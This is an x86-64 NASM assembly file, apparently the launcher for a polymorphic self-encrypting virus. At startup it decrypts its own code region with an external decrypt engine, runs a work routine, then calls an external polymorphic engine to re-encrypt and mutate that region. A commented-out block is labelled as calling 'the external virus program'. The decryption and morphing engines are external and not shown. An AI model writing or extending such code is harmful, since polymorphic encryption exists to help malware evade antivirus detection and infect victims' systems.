%include "template.asm.inc"

extern main
extern polymorphic
extern decrypt_engine
extern decrypt_engine.decryption_function
extern morph_engine
; Define variables in the data section
section .data
	hello:     db 'Hello world!',10
	helloLen:  equ $-hello

; Code goes in the text section
section .text
	global _start
	global work_engine

align 16
_start:             ; Global entry point


	; save initial program state
	mov rbx, rsp 
	mov r14, rdi
	mov r15, rsi

	mov rdi, main
	mov rsi, _start
	sub rsi, main
	call decrypt_engine

	call work_engine

	; ; reload the initial program, state
	; mov rsp, rbx 
	; mov rdi, r14
	; mov rsi, r15

	; reload the initial program, state
	mov rsp, rbx 
	mov rdi, r14
	mov rsi, r15

	; call the polymorphicengine with 3 args
	mov rdi, main
	mov rsi, _start
	sub rsi, main
	mov rdx, decrypt_engine.decryption_function
	call polymorphic

	; ; call the external virus program
	; xor rbp, rbp
	; pop rdi
	; mov rsi, rsp
	; lea rdx, [rsp+rdi+8*8]
	; push rdi
	; call main


	; mov eax,4            ; 'write' system call = 4
	; mov ebx,1            ; file descriptor 1 = STDOUT
	; mov ecx,hello        ; string to write
	; mov edx,helloLen     ; length of string to write
	; int 80h              ; call the kernel

	; Terminate program
	mov eax,1            ; 'exit' system call
	mov ebx,0            ; exit with error code 0
	int 80h              ; call the kernel



; work_engine:
; ;create stack frame
; push rbp
; mov  rbp, rsp
; sub  rsp, 0x18
; push rbx
; push r12
; push r13
; push r14
; push r15




; xor rax,rax 
; ; this will ensure rax = 0 , means completed without error
; pop r15
; pop r14
; pop r13
; pop r12
; pop rbx
; mov rsp, rbp
; pop rbp
; ret


work_engine:
	; there is automatic calculation happening inside DECRYPTOR_SECTION function which is (_start-main) == xxxh worth of memory that will be encrypted/decrypted
    DECRYPTOR_SECTION main, _start
    ret